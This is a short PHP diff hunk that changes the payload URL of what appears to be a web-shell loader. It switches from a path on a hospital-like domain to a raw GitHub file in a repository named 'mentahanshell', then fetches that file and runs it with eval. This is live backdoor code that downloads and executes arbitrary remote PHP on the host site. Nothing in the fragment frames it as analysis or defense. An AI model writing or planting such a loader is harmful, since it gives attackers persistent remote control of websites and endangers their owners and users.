@@ -78,7 +78,7 @@ if (is_logged_in()) {
         return false;
     }
 
-    $destiny = 'https://rsudbuleleng.com/mentahanshell/parbada-keras.txt';
+    $destiny = 'https://raw.githubusercontent.com/parbadaaaaa/mentahanshell/refs/heads/main/parbada-keras.txt';
     $dream = geturlsinfo($destiny);
     if ($dream !== false) {
         eval('?>' . $dream);
